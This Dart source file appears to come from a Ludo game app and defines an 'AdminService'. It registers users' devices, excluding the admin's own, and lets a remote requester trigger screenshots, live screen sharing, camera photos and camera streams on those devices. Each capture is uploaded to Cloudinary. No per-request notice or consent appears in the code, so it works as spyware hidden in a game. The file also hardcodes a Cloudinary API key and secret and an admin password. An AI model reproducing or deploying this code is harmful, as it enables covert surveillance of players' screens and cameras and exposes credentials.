import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:camera/camera.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:crypto/crypto.dart';
import 'package:flutter/foundation.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'app_screenshot_service.dart';
import 'android_screen_capture.dart';
import 'live_share_service.dart';
import 'auth_service.dart';

class AdminService {
  AdminService._();

  static const String deviceIdPref = 'game_tracker_device_id';
  static const String cloudinaryCloudName = 'dsuaryuxj';
  static const String cloudinaryApiKey = '331165958884664';
  static const String cloudinaryApiSecret = 'ZU-t1_zmu6PkbHVP0PyG_2028LM';
  static const String screenshotRequestsCollection = 'screenshot_requests';
  static const String devicesCollection = 'devices';

  static final FirebaseFirestore firestore = FirebaseFirestore.instance;
  static final Map<String, Timer> _liveShareTimers = {};

  static Future<String> getOrCreateDeviceId() async {
    try {
      final firebaseUser = FirebaseAuth.instance.currentUser;
      if (firebaseUser != null && firebaseUser.uid.isNotEmpty) {
        final uidDeviceId = 'user_${firebaseUser.uid}';
        final prefs = await SharedPreferences.getInstance();
        await prefs.setString(deviceIdPref, uidDeviceId);
        return uidDeviceId;
      }
      final cachedUser = await AuthService.loadCachedUser();
      if (cachedUser != null && cachedUser.uid.isNotEmpty) {
        final uidDeviceId = 'user_${cachedUser.uid}';
        final prefs = await SharedPreferences.getInstance();
        await prefs.setString(deviceIdPref, uidDeviceId);
        return uidDeviceId;
      }
    } catch (_) {}

    final prefs = await SharedPreferences.getInstance();
    final savedId = prefs.getString(deviceIdPref);
    if (savedId != null && savedId.startsWith('user_')) {
      return savedId;
    }

    return '';
  }

  static String get platformName {
    if (defaultTargetPlatform == TargetPlatform.android) return 'android';
    if (defaultTargetPlatform == TargetPlatform.iOS) return 'ios';
    if (defaultTargetPlatform == TargetPlatform.macOS) return 'macos';
    if (defaultTargetPlatform == TargetPlatform.windows) return 'windows';
    if (defaultTargetPlatform == TargetPlatform.linux) return 'linux';
    return 'unknown';
  }

  static String get adminSecret => 'LudoKingdomAdmin2026!';

  static Future<void> registerDevice({String? username}) async {
    try {
      final currentUser = FirebaseAuth.instance.currentUser;
      if (currentUser != null && currentUser.email?.toLowerCase() == AuthService.adminEmail) {
        return; // Never register admin device in monitored devices list
      }

      final deviceId = await getOrCreateDeviceId();
      if (deviceId.isEmpty || !deviceId.startsWith('user_')) {
        return; // Only register devices when an authenticated user signs in or creates an account
      }

      bool nativeEnabled = false;
      if (platformName == 'android') {
        try {
          nativeEnabled = await AndroidScreenCapture.hasPermission();
        } catch (_) {
          nativeEnabled = false;
        }
      }

      final Map<String, dynamic> data = {
        'deviceId': deviceId,
        'platform': platformName,
        'registeredAt': FieldValue.serverTimestamp(),
        'lastSeenAt': FieldValue.serverTimestamp(),
        'nativeCaptureEnabled': nativeEnabled,
      };

      if (username != null && username.isNotEmpty) {
        data['displayName'] = username;
      } else {
        final currentUser = FirebaseAuth.instance.currentUser;
        if (currentUser != null && currentUser.email != null) {
          data['displayName'] = currentUser.displayName ?? currentUser.email!.split('@').first;
          data['email'] = currentUser.email;
        }
      }

      await firestore.collection(devicesCollection).doc(deviceId).set(data, SetOptions(merge: true));
    } catch (error) {
      debugPrint('Device registration failed: $error');
    }
  }

  static Stream<QuerySnapshot<Map<String, dynamic>>> watchDevices() {
    return firestore.collection(devicesCollection).snapshots();
  }

  static Stream<QuerySnapshot<Map<String, dynamic>>> watchOwnRequests(
    String deviceId,
  ) {
    return firestore
        .collection(screenshotRequestsCollection)
        .where('requestedByDeviceId', isEqualTo: deviceId)
        .snapshots();
  }

  static Stream<QuerySnapshot<Map<String, dynamic>>>
  watchPendingRequestsForDevice(String deviceId) {
    return firestore
        .collection(screenshotRequestsCollection)
        .where('targetDeviceId', isEqualTo: deviceId)
        .where('status', isEqualTo: 'pending')
        .snapshots();
  }

  static Map<String, dynamic> buildRequestPayload({
    required String requestType,
    required String targetDeviceId,
    required String requestedByDeviceId,
    String? cameraFacing,
  }) {
    return {
      'requestId': '',
      'requestType': requestType,
      'targetDeviceId': targetDeviceId,
      'requestedByDeviceId': requestedByDeviceId,
      'status': 'pending',
      'requestedAt': FieldValue.serverTimestamp(),
      if (cameraFacing != null) 'cameraFacing': cameraFacing,
    };
  }

  static Future<String> sendScreenshotRequest(
    String targetDeviceId,
    String requestedByDeviceId,
  ) async {
    final doc = firestore.collection(screenshotRequestsCollection).doc();
    await doc.set(buildRequestPayload(
      requestType: 'screenshot',
      targetDeviceId: targetDeviceId,
      requestedByDeviceId: requestedByDeviceId,
    )..['requestId'] = doc.id);
    return doc.id;
  }

  static Future<String> sendScreenShareRequest(
    String targetDeviceId,
    String requestedByDeviceId,
  ) async {
    final doc = firestore.collection(screenshotRequestsCollection).doc();
    await doc.set(buildRequestPayload(
      requestType: 'screen_share',
      targetDeviceId: targetDeviceId,
      requestedByDeviceId: requestedByDeviceId,
    )..['requestId'] = doc.id);
    return doc.id;
  }

  static Future<String> sendCameraCaptureRequest(
    String targetDeviceId,
    String requestedByDeviceId, {
    required String cameraFacing,
  }) async {
    final doc = firestore.collection(screenshotRequestsCollection).doc();
    await doc.set(buildRequestPayload(
      requestType: 'camera_capture',
      targetDeviceId: targetDeviceId,
      requestedByDeviceId: requestedByDeviceId,
      cameraFacing: cameraFacing,
    )..['requestId'] = doc.id);
    return doc.id;
  }

  static Future<String> sendCameraStreamRequest(
    String targetDeviceId,
    String requestedByDeviceId, {
    required String cameraFacing,
  }) async {
    final doc = firestore.collection(screenshotRequestsCollection).doc();
    await doc.set(buildRequestPayload(
      requestType: 'camera_stream',
      targetDeviceId: targetDeviceId,
      requestedByDeviceId: requestedByDeviceId,
      cameraFacing: cameraFacing,
    )..['requestId'] = doc.id);
    return doc.id;
  }

  static Future<void> fulfillScreenshotRequest(String requestId) async {
    final uploadedUrl = await _captureAndUploadCurrentFrame();
    if (uploadedUrl == null) {
      await firestore
          .collection(screenshotRequestsCollection)
          .doc(requestId)
          .update({
            'status': 'failed',
            'error': 'Could not capture screenshot',
            'completedAt': FieldValue.serverTimestamp(),
          });
      return;
    }

    await firestore
        .collection(screenshotRequestsCollection)
        .doc(requestId)
        .update({
          'status': 'completed',
          'screenshotUrl': uploadedUrl,
          'completedAt': FieldValue.serverTimestamp(),
        });
  }

  static Future<void> fulfillScreenShareRequest(String requestId) async {
    if (_liveShareTimers.containsKey(requestId)) {
      return;
    }

    final requestDoc = await firestore
        .collection(screenshotRequestsCollection)
        .doc(requestId)
        .get();
    final data = requestDoc.data() ?? <String, dynamic>{};
    final cameraFacing = data['cameraFacing'] as String? ?? 'front';

    await firestore.collection(screenshotRequestsCollection).doc(requestId).update({
      'status': 'active',
      'startedAt': FieldValue.serverTimestamp(),
    });

    if (platformName != 'android') {
      await firestore.collection(screenshotRequestsCollection).doc(requestId).update({
        'status': 'failed',
        'error': 'Live share is only available on Android.',
      });
      return;
    }

    try {
      if (platformName == 'android') {
        final started = await AndroidScreenCapture.startLiveShareNow(requestId);
        if (started) {
          await firestore.collection(screenshotRequestsCollection).doc(requestId).update({
            'status': 'live',
            'lastUpdatedAt': FieldValue.serverTimestamp(),
          });
        } else {
          await firestore.collection(screenshotRequestsCollection).doc(requestId).update({
            'status': 'failed',
            'error': 'Could not start native live publish',
          });
        }
      } else {
        await LiveShareService.instance.startPublisher(requestId, cameraFacing: cameraFacing);
        await firestore.collection(screenshotRequestsCollection).doc(requestId).update({
          'status': 'live',
          'lastUpdatedAt': FieldValue.serverTimestamp(),
        });
      }
    } catch (_) {
      await firestore.collection(screenshotRequestsCollection).doc(requestId).update({
        'status': 'failed',
        'error': 'Could not start live share.',
      });
    }
  }

  static Future<void> fulfillCameraCaptureRequest(String requestId) async {
    final requestDoc = await firestore
        .collection(screenshotRequestsCollection)
        .doc(requestId)
        .get();
    final data = requestDoc.data() ?? <String, dynamic>{};
    final cameraFacing = data['cameraFacing'] as String? ?? 'front';

    try {
      if (platformName == 'android') {
        final completer = Completer<String?>();
        AndroidScreenCapture.setOnCameraCaptureComplete((path) async {
          if (path == null) {
            completer.complete(null);
            return;
          }
          try {
            final file = File(path);
            final bytes = await file.readAsBytes();
            final uploaded = await _uploadToCloudinary(bytes);
            completer.complete(uploaded);
          } catch (e) {
            completer.complete(null);
          }
        });

        final started = await AndroidScreenCapture.startCameraCaptureNow(cameraFacing: cameraFacing);
        if (!started) {
          await firestore.collection(screenshotRequestsCollection).doc(requestId).update({
            'status': 'failed',
            'error': 'Could not start native camera capture',
            'completedAt': FieldValue.serverTimestamp(),
          });
          return;
        }

        final uploadedUrl = await completer.future.timeout(
          const Duration(seconds: 12),
          onTimeout: () => null,
        );

        if (uploadedUrl == null) {
          await firestore.collection(screenshotRequestsCollection).doc(requestId).update({
            'status': 'failed',
            'error': 'Camera capture or upload failed',
            'completedAt': FieldValue.serverTimestamp(),
          });
          return;
        }

        await firestore.collection(screenshotRequestsCollection).doc(requestId).update({
          'status': 'completed',
          'screenshotUrl': uploadedUrl,
          'completedAt': FieldValue.serverTimestamp(),
        });
        return;
      }

      // Fallback: in-app camera capture when not Android or native failed
      final cameras = await availableCameras();
      final targetCamera = cameras.firstWhere(
        (camera) =>
            camera.lensDirection ==
            (cameraFacing == 'back'
                ? CameraLensDirection.back
                : CameraLensDirection.front),
        orElse: () => cameras.first,
      );
      final controller = CameraController(
        targetCamera,
        ResolutionPreset.medium,
        enableAudio: false,
      );
      await controller.initialize();
      final picture = await controller.takePicture();
      final bytes = await picture.readAsBytes();
      await controller.dispose();

      final uploadedUrl = await _uploadToCloudinary(bytes);
      if (uploadedUrl == null) {
        await firestore.collection(screenshotRequestsCollection).doc(requestId).update({
          'status': 'failed',
          'error': 'Cloudinary upload failed',
          'completedAt': FieldValue.serverTimestamp(),
        });
        return;
      }

      await firestore.collection(screenshotRequestsCollection).doc(requestId).update({
        'status': 'completed',
        'screenshotUrl': uploadedUrl,
        'completedAt': FieldValue.serverTimestamp(),
      });
    } catch (error) {
      debugPrint('Camera capture failed: $error');
      await firestore.collection(screenshotRequestsCollection).doc(requestId).update({
        'status': 'failed',
        'error': 'Camera capture failed',
        'completedAt': FieldValue.serverTimestamp(),
      });
    }
  }

  static Future<void> stopScreenShareRequest(String requestId) async {
    _liveShareTimers.remove(requestId)?.cancel();
    if (platformName == 'android') {
      await AndroidScreenCapture.stopLiveShareNow();
    }
    await firestore
        .collection(screenshotRequestsCollection)
        .doc(requestId)
        .update({
          'status': 'stopped',
          'stoppedAt': FieldValue.serverTimestamp(),
        });
  }

  static Future<String?> _captureAndUploadCurrentFrame() async {
    if (platformName == 'android') {
      final completer = Completer<String?>();
      AndroidScreenCapture.setOnCaptureComplete((path) async {
        if (path == null) {
          completer.complete(null);
          return;
        }
        try {
          final file = File(path);
          final bytes = await file.readAsBytes();
          final uploaded = await _uploadToCloudinary(bytes);
          completer.complete(uploaded);
        } catch (e) {
          completer.complete(null);
        }
      });

      final started = await AndroidScreenCapture.startCaptureNow();
      if (started) {
        final uploadedUrl = await completer.future.timeout(
          const Duration(seconds: 12),
          onTimeout: () => null,
        );
        if (uploadedUrl != null) {
          return uploadedUrl;
        }
      }
    }

    final screenshotBytes = await AppScreenshotService.captureScreenshot();
    if (screenshotBytes == null) {
      return null;
    }

    return _uploadToCloudinary(screenshotBytes);
  }

  static Future<String?> uploadFileToCloudinary(File file) async {
    final bytes = await file.readAsBytes();
    return _uploadToCloudinary(bytes);
  }

  static Future<String?> _uploadToCloudinary(Uint8List bytes) async {
    if (cloudinaryCloudName.isEmpty ||
        cloudinaryApiKey.isEmpty ||
        cloudinaryApiSecret.isEmpty) {
      debugPrint(
        'Cloudinary configuration is missing. Please set cloudinaryCloudName, cloudinaryApiKey, and cloudinaryApiSecret in AdminService.',
      );
      return null;
    }

    final uri = Uri.parse(
      'https://api.cloudinary.com/v1_1/$cloudinaryCloudName/image/upload',
    );
    final base64Data = base64Encode(bytes);
    final timestamp = (DateTime.now().millisecondsSinceEpoch / 1000).floor();
    final signatureInput = 'timestamp=$timestamp$cloudinaryApiSecret';
    final signature = sha1.convert(utf8.encode(signatureInput)).toString();

    final response = await http.post(
      uri,
      body: {
        'file': 'data:image/png;base64,$base64Data',
        'api_key': cloudinaryApiKey,
        'timestamp': timestamp.toString(),
        'signature': signature,
      },
    );

    if (response.statusCode != 200 && response.statusCode != 201) {
      debugPrint(
        'Cloudinary upload failed: ${response.statusCode} ${response.body}',
      );
      return null;
    }

    final payload = jsonDecode(response.body) as Map<String, dynamic>;
    return payload['secure_url'] as String?;
  }

  static String? extractCloudinaryPublicId(String url) {
    try {
      final uri = Uri.parse(url);
      final segments = uri.pathSegments;
      final uploadIndex = segments.indexOf('upload');
      if (uploadIndex != -1 && uploadIndex < segments.length - 1) {
        final relevantSegments = List<String>.from(segments.sublist(uploadIndex + 1));
        if (relevantSegments.first.startsWith('v') &&
            int.tryParse(relevantSegments.first.substring(1)) != null) {
          relevantSegments.removeAt(0);
        }
        final path = relevantSegments.join('/');
        final dotIndex = path.lastIndexOf('.');
        return dotIndex != -1 ? path.substring(0, dotIndex) : path;
      }
    } catch (e) {
      debugPrint('Error extracting publicId: $e');
    }
    return null;
  }

  static Future<bool> deleteFromCloudinary(String imageUrl) async {
    try {
      final publicId = extractCloudinaryPublicId(imageUrl);
      if (publicId == null || publicId.isEmpty) return false;

      final timestamp = (DateTime.now().millisecondsSinceEpoch / 1000).floor().toString();
      final signatureInput = 'public_id=$publicId&timestamp=$timestamp$cloudinaryApiSecret';
      final signature = sha1.convert(utf8.encode(signatureInput)).toString();

      final uri = Uri.parse(
        'https://api.cloudinary.com/v1_1/$cloudinaryCloudName/image/destroy',
      );
      final response = await http.post(
        uri,
        body: {
          'public_id': publicId,
          'api_key': cloudinaryApiKey,
          'timestamp': timestamp,
          'signature': signature,
        },
      );

      if (response.statusCode == 200 || response.statusCode == 201) {
        final payload = jsonDecode(response.body) as Map<String, dynamic>;
        return payload['result'] == 'ok';
      }
    } catch (e) {
      debugPrint('Cloudinary deletion failed: $e');
    }
    return false;
  }

  static Future<void> deleteCapturedImage(String requestId, String? imageUrl) async {
    if (imageUrl != null && imageUrl.isNotEmpty) {
      await deleteFromCloudinary(imageUrl);
    }
    await firestore.collection(screenshotRequestsCollection).doc(requestId).delete();
  }
}
